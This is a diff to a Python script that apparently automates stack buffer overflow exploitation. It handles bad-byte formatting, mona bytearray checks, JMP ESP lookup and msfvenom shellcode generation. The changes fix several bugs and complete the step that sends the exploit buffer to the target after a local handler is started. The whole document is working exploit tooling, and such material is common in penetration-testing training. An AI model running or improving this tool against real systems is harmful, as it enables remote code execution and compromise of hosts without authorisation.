@@ -34,7 +34,10 @@ def main():
 	
 	badbytes_str = ''
 	for b in badbytes:
-		badbytes_str += '\\x' + str(hex(b))[2::]
+		b = str(hex(b))[2::]
+		if len(b) == 1:
+			b = '0' + b
+		badbytes_str += '\\x' + b
 	print(f'Bad bytes: {badbytes_str}')
 
 	# generate buffer
@@ -51,9 +54,9 @@ def main():
 	
 	# ask user to start local handler
 	print('Start Local handler for exploit.')
-	
+	input('Press enter when done.')
 	# pwn target
-	
+	connect_and_send(target, buffer, args)
 
 def getJmpESPAddr(badbytes):
 	print("Get EIP to jump to payload...")
@@ -77,7 +80,7 @@ def check_badbytes(target, badbytes, eip_offset, args):
 		print(f'!mona bytearray 256 -b {str(badbytes)[1::]}')
 		input('Press enter when target running.')
 		# use bytearray for easy indexing
-		checkbytes = bytearray(0xFF - len(badbytes))
+		checkbytes = bytearray(0x100 - len(badbytes))
 		idx = 0
 		for i in range(0xFF):
 			if i in badbytes:
@@ -287,7 +290,8 @@ def gen_payload(badbytes, args):
 	payload_hex = os.popen(msfvenom_cmd).read()
 
 	if args.payload_out_file_hex:
-		payload_out_file_hex.write(payload_hex)
+		args.payload_out_file_hex.write(payload_hex)
+		args.payload_out_file_hex.close()
 	
 	print('-' * 20 + 'PAYLOAD HEX' + '-' * 20)
 	print(payload_hex)
